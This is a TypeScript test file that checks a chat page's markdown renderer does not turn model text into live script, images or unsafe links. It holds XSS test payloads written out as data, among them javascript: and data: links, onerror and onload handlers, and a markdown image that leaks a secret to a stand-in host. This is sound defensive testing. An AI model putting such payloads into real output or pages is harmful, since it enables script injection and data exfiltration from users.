/**
 * The renderer is the page's only path from model text to DOM. These tests
 * pin its guarantees: allowlisted elements and attributes only, no script
 * reachable, no <img>, safe links. They replay the October audit payloads
 * and the red-team corpus.
 */
import { describe, expect, it } from "vitest";
import corpus from "../../../test/redteam/corpus.json";
import { ALLOWED_ATTRIBUTES, ALLOWED_ELEMENTS, renderMarkdown, safeHref } from "./markdown";

function render(source: string): HTMLDivElement {
	const host = document.createElement("div");
	host.append(renderMarkdown(source));
	return host;
}

function assertSafe(host: HTMLElement, label: string) {
	for (const node of host.querySelectorAll("*")) {
		expect(ALLOWED_ELEMENTS.has(node.tagName), `${label}: <${node.tagName}>`).toBe(true);
		const allowed = ALLOWED_ATTRIBUTES[node.tagName] ?? new Set<string>();
		for (const attr of node.getAttributeNames()) {
			expect(allowed.has(attr), `${label}: ${node.tagName}[${attr}]`).toBe(true);
		}
		if (node instanceof HTMLAnchorElement) {
			expect(node.protocol, label).toMatch(/^(https?|mailto):$/);
			expect(node.rel).toBe("noopener noreferrer nofollow");
			expect(node.target).toBe("_blank");
		}
	}
	expect(host.querySelector("img, script, iframe, svg, style, object, embed, form, input")).toBeNull();
}

describe("audit payloads", () => {
	const payloads: Record<string, string> = {
		"javascript link": "[x](javascript:window.__xss=2)",
		"quote breakout": '[x](https://a/"onmouseover="window.__xss=3)',
		"raw script": "<script>window.__xss=4</script>",
		"img onerror": '<img src=x onerror="window.__xss=1">',
		"markdown image exfil": "![leak](https://evil.example/?d=SECRET)",
		"data link": "[x](data:text/html,<script>alert(1)</script>)",
		"vbscript link": "[x](vbscript:msgbox)",
		"entity-encoded scheme": "[x](&#106;avascript:alert(1))",
		"svg": '<svg onload="window.__xss=6"></svg>',
		"iframe": '<iframe src="https://evil.example"></iframe>',
		"style": "<style>body{display:none}</style>",
		"autolink js": "<javascript:alert(1)>",
	};

	for (const [name, source] of Object.entries(payloads)) {
		it(`renders ${name} inertly`, () => {
			const host = render(source);
			assertSafe(host, name);
		});
	}

	it("keeps raw HTML visible as text", () => {
		const host = render("<b onclick=1>raw</b>");
		expect(host.textContent).toContain("<b onclick=1>");
		expect(host.querySelector("b")).toBeNull();
	});

	it("renders an image as a link, never as an <img>", () => {
		const host = render("![chart](https://example.com/c.png)");
		const a = host.querySelector("a");
		expect(a?.textContent).toBe("chart");
		expect(a?.href).toBe("https://example.com/c.png");
		expect(host.querySelector("img")).toBeNull();
	});

	it("does not let a quote break out of an href", () => {
		const host = render('[x](https://a/"onmouseover="alert(1))');
		const a = host.querySelector("a");
		if (a) expect(a.getAttributeNames().sort()).toEqual(["href", "rel", "target"]);
	});
});

describe("red-team corpus", () => {
	for (const entry of corpus.input) {
		it(`renders ${entry.id} inertly`, () => assertSafe(render(entry.text), entry.id));
	}
});

describe("rendering", () => {
	it("supports the formatting replies use", () => {
		const host = render(
			"## Title\n\nSome **bold**, *em*, ~~del~~ and `code`.\n\n- a\n- b\n\n1. one\n2. two\n\n> quoted\n\n```ts\nconst x = 1;\n```\n\n| h | k |\n|---|---|\n| 1 | 2 |",
		);
		assertSafe(host, "formatting");
		expect(host.querySelector("h3")?.textContent).toBe("Title");
		expect(host.querySelector("strong")?.textContent).toBe("bold");
		expect(host.querySelector("del")?.textContent).toBe("del");
		expect(host.querySelectorAll("ul li")).toHaveLength(2);
		expect(host.querySelectorAll("ol li")).toHaveLength(2);
		expect(host.querySelector("blockquote")?.textContent).toContain("quoted");
		const pre = host.querySelector("pre");
		expect(pre?.dir).toBe("ltr");
		expect(pre?.querySelector("code")?.dataset.lang).toBe("ts");
		expect(pre?.textContent).toBe("const x = 1;");
		expect(host.querySelectorAll(".md-table td")).toHaveLength(2);
	});

	it("turns single newlines into line breaks, as replies always have", () => {
		expect(render("one\ntwo").querySelector("br")).not.toBeNull();
	});

	it("drops an unsafe code language label", () => {
		expect(render('```" onload="x\ncode\n```').querySelector("code")?.dataset.lang).toBeUndefined();
	});

	it("renders an empty string as nothing", () => {
		expect(render("").childNodes).toHaveLength(0);
	});
});

describe("safeHref", () => {
	it("allows http, https and mailto", () => {
		expect(safeHref("https://a.b/c")).toBe("https://a.b/c");
		expect(safeHref("mailto:x@y.z")).toBe("mailto:x@y.z");
	});

	it("refuses everything else", () => {
		for (const bad of ["javascript:x", " JavaScript:x", "data:text/html,x", "vbscript:x", "file:///etc", "", "   "]) {
			expect(safeHref(bad), bad).toBeNull();
		}
	});
});
